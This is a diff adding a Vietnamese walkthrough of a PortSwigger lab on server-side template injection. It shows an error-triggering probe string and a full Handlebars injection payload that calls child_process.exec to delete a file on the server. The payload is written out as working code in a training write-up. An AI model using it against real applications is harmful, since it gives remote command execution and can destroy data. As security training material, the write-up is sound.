@@ -8,6 +8,7 @@
     - [Lab: Basic server-side template injection](https://github.com/DucThinh47/PortSwigger/blob/main/Server-side_template_injection/Contents.md#lab-basic-server-side-template-injection)
     - [Lab: Basic server-side template injection (code context)](https://github.com/DucThinh47/PortSwigger/blob/main/Server-side_template_injection/Contents.md#lab-basic-server-side-template-injection-code-context)
     - [Lab: Server-side template injection using documentation](https://github.com/DucThinh47/PortSwigger/blob/main/Server-side_template_injection/Contents.md#lab-server-side-template-injection-using-documentation)
+    - [Lab: Server-side template injection in an unknown language with a documented exploit]()
 
 # What is server-side template injection (SSTI)?
 `Server-side template injection` xảy ra khi kẻ tấn công có thể sử dụng `cú pháp template gốc` để chèn một đoạn mã độc (payload) vào template, sau đó mã này sẽ được thực thi ở phía máy chủ.
@@ -256,6 +257,54 @@ Search payload để xóa file `morale.txt` trên chatgpt:
 Thử chèn payload này vào template:
 
 ![img](https://github.com/DucThinh47/PortSwigger/blob/main/Server-side_template_injection/images/image21.png?raw=true)
+
+## Lab: Server-side template injection in an unknown language with a documented exploit
+**1. Yêu cầu**
+
+Lab này có lỗ hổng Server-side Template Injection. Để giải quyết, bạn cần xác định công cụ template đang được sử dụng, sau đó tìm một khai thác (exploit) đã được ghi nhận trên mạng mà bạn có thể dùng để thực thi mã tùy ý, và cuối cùng là xóa tệp morale.txt khỏi thư mục chính của Carlos.
+
+**2. Thực hiện**
+
+Click vào xem chi tiết 1 sản phẩm thì thông báo `Unfortunately this product is out of stock` hiển thị:
+
+![img](22)
+
+Kiểm tra request:
+
+![img](23)
+
+Để ý đường dẫn trong Request headers có tham số `message`. Thử thay đổi giá trị của tham số này thành `${{<%[%'"}}%\` và send request:
+
+![img](24)
+
+Dựa vào phản hồi lỗi từ server, tôi đã tìm hiểu đây là Handlebars template. Trên mạng có 1 blog về kỹ thuật [Handlebars template injection](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html). Sau khi tìm hiểu blog, tạo ra được payload sau:
+
+    wrtz{{#with "s" as |string|}}
+        {{#with "e"}}
+            {{#with split as |conslist|}}
+                {{this.pop}}
+                {{this.push (lookup string.sub "constructor")}}
+                {{this.pop}}
+                {{#with string.split as |codelist|}}
+                    {{this.pop}}
+                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                    {{this.pop}}
+                    {{#each conslist}}
+                        {{#with (string.sub.apply 0 codelist)}}
+                            {{this}}
+                        {{/with}}
+                    {{/each}}
+                {{/with}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+
+Thay giá trị tham số message thành payload này:
+
+![img](25)
+
+
+
 
 
 
